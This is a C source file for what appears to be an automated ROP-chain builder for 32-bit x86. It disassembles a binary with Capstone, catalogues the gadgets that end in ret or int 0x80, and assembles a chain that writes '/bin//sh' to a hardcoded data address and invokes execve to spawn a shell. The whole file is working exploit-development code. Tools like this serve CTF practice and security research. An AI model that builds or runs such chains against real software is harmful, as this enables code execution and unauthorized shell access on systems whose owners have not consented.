#include "rop.h"

int rop_chain(unsigned char *binary, unsigned long binary_len)
{
    struct Node *root;
    root = (struct Node *)malloc(sizeof(struct Node));
    if(!root)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    struct Gadget *head;
    head = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!head)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    rop_parse_gadgets(root, binary, binary_len);
    rop_chain_execve(root, head);
    tree_free(root);
    return 0;
}

int rop_parse_gadgets(struct Node *root, unsigned char *binary, unsigned long binary_len)
{
    size_t count;
    csh handle;
    cs_insn *insn;
    char gadget_string[MaxGadgetLen];
    unsigned int text_address = 0x08048000;
    int total_gadget = 0;
    size_t i,j,k;

    tree_init(root);

    if(cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
        return -1;
    }
    for(i = 0; i < binary_len - MaxGadgetByte; i++)
    {
        count = cs_disasm_ex(handle, binary + i, MaxGadgetByte, text_address + i, 0, &insn);
        if(count > 0)
        {
            strcpy(gadget_string, "");
            for(j = 0; j < count; j++)
            {
                if(!strcmp(insn[j].mnemonic, "ret") && j)
                {
                    total_gadget++;
                    for (k = 0; k < j; k++)
                    {
                        strcat(gadget_string, insn[k].mnemonic);
                        if(strlen(insn[k].op_str) > 0)
                        {
                            strcat(gadget_string, " ");
                            strcat(gadget_string, insn[k].op_str);
                        }
                        strcat(gadget_string, " ; ");
                        /* tree build */
                        tree_build(root, 0, insn, j+1);
                    }
                    strcat(gadget_string, "ret");
                    /* print all gadgets */
                    printf("%d\t0x0%x:\t%s\n", j+1, text_address + i, gadget_string);
                    strcpy(gadget_string, "");
                    break;
                }
                else if(j == 0 && !strcmp(insn[j].mnemonic, "int") && !strcmp(insn[j].op_str, "0x80"))
                {
                    total_gadget++;
                    /* tree build */
                    tree_build(root, 0, insn, j+1);
                    /* print int80 gadgets */
                    printf("%d\t0x0%"PRIx64":\tint 0x80\n", j+1, insn[j].address);
                    break;
                }
            }
            cs_free(insn, count);
        }
    }
    printf("Gadget find = %d\n",total_gadget);
    cs_close(&handle);
    return 0;
}

int rop_chain_execve(struct Node *root, struct Gadget *head)
{
    unsigned int result = 1;
    size_t i = 0;
    rop_chain_list_init(head);
    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
    rop_chain_list_add(head, 0x080ef060, "@. data");
    result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
    rop_chain_list_add(head, 0x6e69622f, "/bin");
    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);

    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
    rop_chain_list_add(head, 0x080ef064, "@. data + 4");
    result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
    rop_chain_list_add(head, 0x68732f2f, "//sh");
    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);
    
    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
    result *= rop_search_gadgets(root, head, "xor eax, eax;ret", 1);
    result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);

    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
    rop_chain_list_add(head, 0x080ef060, "@. data");
    result *= rop_search_gadgets(root, head, "pop ecx;ret", 1);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");

    result *= rop_search_gadgets(root, head, "xor eax, eax;ret", 1);
    for(i = 0; i < 11; i++)
        result *= rop_search_gadgets(root, head, "inc eax;ret", 1);
    result *= rop_search_gadgets(root, head, "int 0x80", 1);
    if(!result)
    {
        printf("chain execve failed\n");
    }
    else
    {
        rop_chain_list_traverse(head);
    }
    rop_chain_list_free(head);
    return 0;
}

unsigned int rop_search_gadgets(struct Node *root, struct Gadget *head, char *gadget_string, int add_list)
{
    char *token;
    char copy_string[MaxGadgetLen];
    strcpy(copy_string, gadget_string);
    token = strtok(copy_string, ";");
    while(token != NULL)
    {
        root = tree_search(root, token);
        if(!root)
        {
            printf("can't find gadget *%s*\n", gadget_string);
            return 0;
        }
        token = strtok(NULL, ";");
    }
    if(add_list)
    {
        rop_chain_list_add(head, root->address, gadget_string);
    }
    else
    {
        printf("0x0%x: %s\n", root->address, gadget_string);
    }
    return root->address;
}

void rop_chain_list_init(struct Gadget *head)
{
    head->next = 0;
    head->prev = 0;
}

int rop_chain_list_add(struct Gadget *head, unsigned int address, char *string)
{
    struct Gadget *gadget;
    if(strlen(string) > MaxGadgetLen)
    {
        fprintf(stderr ,"Gadget buffer overflow.\n");
        return -1;
    }

    gadget = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!gadget)
    {
        fprintf(stderr ,"malloc failed.\n");
        exit(-1);
    }
    gadget->address = address;
    gadget->next = NULL;
    strcpy(gadget->string, string);
    if(head->next)
    {
        gadget->prev = head->prev;
        head->prev->next = gadget;
        head->prev = gadget;
    }
    else
    {
        head->next = gadget;
        head->prev = gadget;
    }
    return 0;
}

void rop_chain_list_traverse(struct Gadget *head)
{
    struct Gadget *temp;
    for(temp = head->next; temp; temp = temp->next)
    {
        printf("0x%08x: %s\n", temp->address, temp->string);
    }

}

void rop_chain_list_free(struct Gadget *head)
{
    struct Gadget *temp;
    while(head->next != NULL)
    {
        temp = head->next;
        head->next = head->next->next;
        free(temp);
    }
    free(head);
}
